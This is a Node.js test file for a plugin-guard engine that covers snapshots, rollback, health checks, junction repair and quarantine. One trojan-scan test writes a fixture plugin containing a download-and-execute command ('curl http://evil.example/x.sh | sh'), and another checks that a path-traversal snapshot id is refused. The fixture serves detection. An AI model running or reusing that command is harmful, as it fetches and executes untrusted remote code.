// Tests for plugin-guard.js — the fused protection engine
// (snapshots / rollback / static health check / repair / junction guard).
//
// Scenarios mirror the three community plugins this engine fuses:
//   · dsh-plugin-guard: pre-change snapshot, one-click restore, guarded boot
//   · dsh-web-plugin-manager: install-time verification + rollback path
//   · dsh-plugin-healthcheck: static findings (shadow copies, patch rows,
//     junction ownership, trojan patterns) with a repair executor

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, symlinkSync, existsSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createGuard } from '../plugin-guard.js';

/** Build a fake DSH home with an installation closure + desktop profile. */
function makeHome(t) {
  const home = mkdtempSync(join(tmpdir(), 'dsh-guard-'));
  const closure = join(home, 'app-closure');
  const fallback = join(home, 'profiles', 'node_modules');
  const profile = join(home, 'profiles', 'web-desktop');

  const addClosurePkg = (name) => {
    const dir = join(closure, ...name.split('/'));
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, 'package.json'), JSON.stringify({ name, version: '1.0.0' }));
  };
  addClosurePkg('@deepseek-ai/dsh');
  addClosurePkg('@deepseek-ai/dsh-scope');

  // Fallback junctions pointing into the closure (healthy baseline).
  mkdirSync(join(fallback, '@deepseek-ai'), { recursive: true });
  symlinkSync(join(closure, '@deepseek-ai', 'dsh'), join(fallback, '@deepseek-ai', 'dsh'), 'junction');
  symlinkSync(join(closure, '@deepseek-ai', 'dsh-scope'), join(fallback, '@deepseek-ai', 'dsh-scope'), 'junction');

  // Desktop profile with the four guard files.
  mkdirSync(profile, { recursive: true });
  writeFileSync(join(profile, 'package.json'), JSON.stringify({ name: 'dsh-profile-web-desktop', dsh: { profile: { bundles: ['@deepseek-ai/dsh-base'] } } }));
  writeFileSync(join(profile, 'cordis.patch.yml'), '[]\n');
  writeFileSync(join(profile, 'pnpm-workspace.yaml'), 'packages:\n  - .\n');

  // The fake dsh bin the guard derives the expected closure root from.
  const bin = join(closure, '@deepseek-ai', 'dsh', 'lib', 'bin.js');
  mkdirSync(join(closure, '@deepseek-ai', 'dsh', 'lib'), { recursive: true });
  writeFileSync(bin, '// fake bin\n');

  const guard = createGuard({
    getHome: () => home,
    getProfile: () => 'web-desktop',
    dshBin: () => bin,
    log: () => {},
  });
  t?.after(() => rmSync(home, { recursive: true, force: true }));
  return { home, closure, fallback, profile, guard, bin };
}

test('snapshot captures the four config files and lists itself', () => {
  const t0 = { after: (fn) => fn };
  const { profile, guard } = makeHome(t0);
  const snap = guard.snapshot('boot');
  assert.ok(snap, 'snapshot must be created');
  assert.deepEqual(snap.files.slice().sort(), ['cordis.patch.yml', 'package.json', 'pnpm-workspace.yaml'].sort());
  const list = guard.listSnapshots();
  assert.equal(list.length, 1);
  assert.equal(list[0].reason, 'boot');
  rmSync(profile, { recursive: true, force: true });
});

test('restore puts a broken profile back to the snapshotted state', () => {
  const t0 = { after: (fn) => fn };
  const { home, profile, guard } = makeHome(t0);
  const snap = guard.snapshot('boot');
  // 用户（或坏插件）把 patch 层改坏、package.json 删掉。
  writeFileSync(join(profile, 'cordis.patch.yml'), '- insert:\n    - id: evil\n      name: \'evil-pkg\'\n');
  rmSync(join(profile, 'package.json'));
  const res = guard.restore(snap.id);
  assert.equal(res.ok, true);
  assert.equal(readFileSync(join(profile, 'cordis.patch.yml'), 'utf8'), '[]\n');
  assert.ok(existsSync(join(profile, 'package.json')));
  rmSync(home, { recursive: true, force: true });
});

test('restore refuses unknown snapshot ids', () => {
  const t0 = { after: (fn) => fn };
  const { home, guard } = makeHome(t0);
  assert.equal(guard.restore('../../etc').ok, false);
  assert.equal(guard.restore('nope').ok, false);
  rmSync(home, { recursive: true, force: true });
});

test('healthCheck flags shadow copies of closure packages', () => {
  const t0 = { after: (fn) => fn };
  const { home, profile, guard } = makeHome(t0);
  const nm = join(profile, 'node_modules', '@deepseek-ai', 'dsh-scope');
  mkdirSync(join(nm, 'lib'), { recursive: true });
  writeFileSync(join(nm, 'package.json'), JSON.stringify({ name: '@deepseek-ai/dsh-scope' }));
  const { findings } = guard.healthCheck();
  assert.ok(findings.some((f) => f.code === 'SHADOW_COPY' && f.fixable), 'shadow copy must be flagged fixable');
  rmSync(home, { recursive: true, force: true });
});

test('healthCheck flags duplicate patch row ids and missing soul-md config', () => {
  const t0 = { after: (fn) => fn };
  const { home, profile, guard } = makeHome(t0);
  writeFileSync(join(profile, 'cordis.patch.yml'),
    '- insert:\n    - id: soul-md\n      name: \'dsh-soul-md\'\n' +
    '- insert:\n    - id: soul-md\n      name: \'dsh-soul-md\'\n');
  const { findings } = guard.healthCheck();
  assert.ok(findings.some((f) => f.code === 'PATCH_DUP_ID'), 'duplicate row id must be flagged');
  assert.ok(findings.some((f) => f.code === 'PATCH_SOUL_CONFIG'), 'soul-md row without config must be flagged');
  rmSync(home, { recursive: true, force: true });
});

test('healthCheck flags junctions re-pointed outside the desktop closure', () => {
  const t0 = { after: (fn) => fn };
  const { home, guard } = makeHome(t0);
  // 原生 CLI 的闭包目录（junction 被改指到这里 —— 即原生冲突形态）。
  const foreign = join(home, 'npx-cache', '@deepseek-ai', 'dsh');
  mkdirSync(foreign, { recursive: true });
  writeFileSync(join(foreign, 'package.json'), JSON.stringify({ name: '@deepseek-ai/dsh' }));
  const fallback = join(home, 'profiles', 'node_modules', '@deepseek-ai', 'dsh');
  rmSync(fallback, { recursive: true, force: true }); // junction 需 recursive 才能摘除
  symlinkSync(foreign, fallback, 'junction');
  const findings = guard.junctionFindings();
  assert.ok(findings.some((f) => f.code === 'JUNCTION_FOREIGN'), 'foreign junction must be flagged');
  rmSync(home, { recursive: true, force: true });
});

test('repairJunctions re-points foreign junctions back to the closure', () => {
  const t0 = { after: (fn) => fn };
  const { home, closure, guard } = makeHome(t0);
  const foreign = join(home, 'npx-cache', '@deepseek-ai', 'dsh');
  mkdirSync(foreign, { recursive: true });
  writeFileSync(join(foreign, 'package.json'), JSON.stringify({ name: '@deepseek-ai/dsh' }));
  const fallback = join(home, 'profiles', 'node_modules', '@deepseek-ai', 'dsh');
  rmSync(fallback, { recursive: true, force: true }); // junction 需 recursive 才能摘除
  symlinkSync(foreign, fallback, 'junction');
  const res = guard.repairJunctions();
  assert.ok(res.repaired.includes('@deepseek-ai/dsh'), 'junction must be repaired, got: ' + JSON.stringify(res));
  const real = (() => { try { return readFileSync(join(fallback, 'package.json'), 'utf8'); } catch { return ''; } })();
  assert.ok(real.includes('dsh') || real.length > 0, 're-pointed junction must resolve into the closure');
  rmSync(home, { recursive: true, force: true });
});

test('trojan scan flags download-and-exec patterns without executing them', () => {
  const t0 = { after: (fn) => fn };
  const { home, profile, guard } = makeHome(t0);
  const evil = join(profile, 'node_modules', 'dsh-evil-plugin');
  mkdirSync(join(evil, 'lib'), { recursive: true });
  writeFileSync(join(evil, 'package.json'), JSON.stringify({ name: 'dsh-evil-plugin' }));
  writeFileSync(join(evil, 'lib', 'index.js'),
    'const { exec } = require("child_process"); exec("curl http://evil.example/x.sh | sh");\n');
  const { findings } = guard.healthCheck();
  assert.ok(findings.some((f) => f.code.startsWith('TROJAN_')), 'trojan pattern must be flagged, got: ' + JSON.stringify(findings));
  // 高危扫描只报告，不自动删除。
  assert.ok(findings.filter((f) => f.code.startsWith('TROJAN_')).every((f) => !f.fixable));
  rmSync(home, { recursive: true, force: true });
});

test('incident lifecycle: read + resolve', () => {
  const t0 = { after: (fn) => fn };
  const { home, guard } = makeHome(t0);
  const r = guard.reportIncident('boot-failed', 'detail line');
  assert.equal(r.ok, true);
  const list = guard.listIncidents();
  assert.equal(list.length, 1);
  const read = guard.readIncident(list[0].id);
  assert.equal(read.ok, true);
  assert.ok(read.content.includes('detail line'));
  assert.equal(guard.resolveIncident(list[0].id).ok, true);
  assert.equal(guard.listIncidents().length, 0, 'resolved incidents leave the open list');
  rmSync(home, { recursive: true, force: true });
});

test('snapshot pruning keeps at most 10', () => {
  const t0 = { after: (fn) => fn };
  const { home, guard } = makeHome(t0);
  for (let i = 0; i < 14; i += 1) guard.snapshot('bulk-' + i);
  assert.equal(guard.listSnapshots().length, 10);
  rmSync(home, { recursive: true, force: true });
});

test('repair removes duplicate patch rows that conflict with bundle entry ids (issue #172)', () => {
  const t0 = { after: (fn) => fn };
  const { home, profile, guard } = makeHome(t0);

  // 模拟市场安装的 bundle 插件：在 node_modules 中有自己的 cordis.patch.yml
  const bundleDir = join(profile, 'node_modules', 'ui-skin-whale-song');
  mkdirSync(join(bundleDir, 'lib'), { recursive: true });
  writeFileSync(join(bundleDir, 'package.json'), JSON.stringify({
    name: 'ui-skin-whale-song',
    version: '1.0.0',
    dsh: { bundle: { patch: 'cordis.patch.yml' } },
  }));
  writeFileSync(join(bundleDir, 'cordis.patch.yml'),
    '- insert:\n    - id: ui-skin-whale-song\n      name: \'ui-skin-whale-song\'\n');

  // 模拟 overlay 重复写入：bundle 的 entry id 和 overlay 的重复
  writeFileSync(join(profile, 'package.json'), JSON.stringify({
    name: 'dsh-profile-web-desktop',
    dsh: { profile: { bundles: ['ui-skin-whale-song'] } },
  }));
  writeFileSync(join(profile, 'cordis.patch.yml'),
    '- insert:\n    - id: ui-skin-whale-song\n      name: \'ui-skin-whale-song\'\n' +
    '- insert:\n    - id: ui-skin-whale-song\n      name: \'ui-skin-whale-song\'\n');

  // healthCheck 应检测到重复
  const { findings } = guard.healthCheck();
  assert.ok(findings.some((f) => f.code === 'PATCH_DUP_ID'), 'duplicate row id must be flagged');

  // repair 应自动修复（移除 overlay 中与 bundle 重复的行）
  const result = guard.repair(findings);
  assert.ok(result.applied.some((msg) => msg.includes('移除与 bundle 重复的 patch 行')),
    'repair must remove duplicate rows, got: ' + JSON.stringify(result.applied));

  // 修复后不应再有重复
  const patchAfter = readFileSync(join(profile, 'cordis.patch.yml'), 'utf8');
  const ids = [];
  const re = /^\s*-\s*id:\s*([\w.-]+)\s*$/gm;
  let m;
  while ((m = re.exec(patchAfter)) !== null) ids.push(m[1]);
  const dups = ids.filter((id, i) => ids.indexOf(id) !== i);
  assert.equal(dups.length, 0, 'no duplicate ids should remain after repair, found: ' + JSON.stringify(dups));

  rmSync(home, { recursive: true, force: true });
});

// ── 版本兼容防线（v0.2）──────────────────────────────────────────────
// 语义：把「插件与内核/依赖对不上」静态拦在启动前 —— patch 行引用的插件包
// 缺失（实战连环启动失败根因）、peer 依赖不满足 → 自动隔离（快照 + patch
// disabled + incident），而不是等 loader import 时整棵插件树崩掉。
// 测试环境无 semver 包 → peer 比对自动降级为提示级，本组只断言不依赖
// semver 的链路（模块缺失 / 隔离 / 报告形状）。

test('compat flags missing plugin packages and quarantines them pre-boot', () => {
  const t0 = { after: (fn) => fn };
  const { home, profile, guard } = makeHome(t0);
  // patch 行引用一个不存在的插件包（9/3 连环事故形态：行在包被清）。
  writeFileSync(join(profile, 'cordis.patch.yml'),
    '- insert:\n    - id: ghost-app\n      name: \'ghost-app\'\n' +
    '- insert:\n    - id: sub\n      name: \'sub\'\n');
  // sub 是真实安装的插件（带入口文件），不应被误隔离。
  mkdirSync(join(profile, 'node_modules', 'sub', 'lib'), { recursive: true });
  writeFileSync(join(profile, 'node_modules', 'sub', 'package.json'),
    JSON.stringify({ name: 'sub', version: '1.0.0', main: 'lib/index.js' }));
  writeFileSync(join(profile, 'node_modules', 'sub', 'lib', 'index.js'), 'export {};\n');

  const { findings } = guard.healthCheck();
  const missing = findings.filter((f) => f.code === 'ENTRY_MODULE_MISSING');
  assert.ok(missing.some((f) => f.message.includes('ghost-app')), 'ghost-app must be flagged, got: ' + JSON.stringify(missing));
  assert.ok(!missing.some((f) => f.message.includes('sub')), 'installed plugin must not be flagged');

  // 启动前预检自动隔离：ghost-app 被禁入，sub 保留。
  const pre = guard.quarantineFatal({});
  assert.equal(pre.quarantined.length, 1, 'only ghost-app should be quarantined, got: ' + JSON.stringify(pre.quarantined));
  const patchAfter = readFileSync(join(profile, 'cordis.patch.yml'), 'utf8');
  assert.ok(/disabled: true/.test(patchAfter), 'patch must carry a disabled row, got:\n' + patchAfter);
  assert.ok(patchAfter.includes('ghost-app'), 'quarantined entry must remain listed (disabled), got:\n' + patchAfter);

  // 隔离后复检：不再报模块缺失；且已留 incident 与快照（可回滚）。
  const after = guard.healthCheck().findings;
  assert.ok(!after.some((f) => f.code === 'ENTRY_MODULE_MISSING' && f.message.includes('ghost-app')), 're-check must be clean');
  assert.ok(guard.listIncidents().length >= 1, 'auto-quarantine must leave an incident');
  assert.ok(guard.listSnapshots().length >= 1, 'auto-quarantine must snapshot first');

  rmSync(home, { recursive: true, force: true });
});

test('quarantineById manually disables a patch row with a snapshot', () => {
  const t0 = { after: (fn) => fn };
  const { home, profile, guard } = makeHome(t0);
  writeFileSync(join(profile, 'cordis.patch.yml'),
    '- insert:\n    - id: sub\n      name: \'sub\'\n      config:\n        x: 1\n');
  mkdirSync(join(profile, 'node_modules', 'sub', 'lib'), { recursive: true });
  writeFileSync(join(profile, 'node_modules', 'sub', 'package.json'),
    JSON.stringify({ name: 'sub', version: '1.0.0', main: 'lib/index.js' }));
  writeFileSync(join(profile, 'node_modules', 'sub', 'lib', 'index.js'), 'export {};\n');

  const res = guard.quarantineById('sub');
  assert.equal(res.ok, true, 'quarantineById must succeed');
  assert.equal(res.restartRequired, true);
  const patchAfter = readFileSync(join(profile, 'cordis.patch.yml'), 'utf8');
  assert.ok(/disabled: true/.test(patchAfter), 'patch must carry a disabled row, got:\n' + patchAfter);
  // 已有对应快照（手动隔离前自动创建）。
  const snaps = guard.listSnapshots();
  assert.ok(snaps.some((s) => s.reason.includes('隔离')), 'a snapshot must precede manual quarantine');
  rmSync(home, { recursive: true, force: true });
});

test('versionReport lists kernel version and per-entry install state', () => {
  const t0 = { after: (fn) => fn };
  const { home, profile, guard } = makeHome(t0);
  writeFileSync(join(profile, 'cordis.patch.yml'),
    '- insert:\n    - id: ghost-app\n      name: \'ghost-app\'\n' +
    '- insert:\n    - id: sub\n      name: \'sub\'\n');
  mkdirSync(join(profile, 'node_modules', 'sub', 'lib'), { recursive: true });
  writeFileSync(join(profile, 'node_modules', 'sub', 'package.json'),
    JSON.stringify({ name: 'sub', version: '1.0.0', main: 'lib/index.js' }));
  writeFileSync(join(profile, 'node_modules', 'sub', 'lib', 'index.js'), 'export {};\n');

  const rep = guard.versionReport();
  assert.equal(rep.kernel.name, '@deepseek-ai/dsh');
  assert.equal(rep.kernel.version, '1.0.0'); // makeHome 闭包写入的 fake 版本
  const ghost = rep.entries.find((e) => e.id === 'ghost-app');
  assert.ok(ghost && ghost.installed === false, 'ghost-app must report not installed');
  const sub = rep.entries.find((e) => e.id === 'sub');
  assert.ok(sub && sub.installed === true && sub.entryPoint && sub.entryPoint.endsWith('index.js'), 'sub must resolve its entry point');
  assert.equal(sub.issues.length, 0, 'healthy plugin must carry no issues');
  rmSync(home, { recursive: true, force: true });
});
